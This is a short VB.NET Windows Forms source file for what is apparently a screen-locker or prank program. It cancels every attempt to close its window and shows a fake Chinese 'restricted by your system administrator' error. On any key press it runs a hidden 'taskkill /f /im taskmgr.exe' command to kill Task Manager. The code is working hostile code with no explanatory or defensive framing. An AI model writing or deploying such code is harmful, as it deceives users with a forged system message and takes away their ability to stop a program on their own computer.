Imports System.ComponentModel

Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        WindowState = 2
        Form2.MdiParent = Me
        Form2.Show()
    End Sub
    Private Sub Form2_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Form2.Show()
    End Sub

    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Dim unused = MsgBox("本次操作由于这台计算机的限制而被取消，请与您的系统管理员联系。", vbCritical, "限制")
        e.Cancel = True
    End Sub

    Private Sub Form1_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        Dim unused = Shell("cmd /c taskkill /f /im taskmgr.exe", vbHide)
    End Sub
End Class
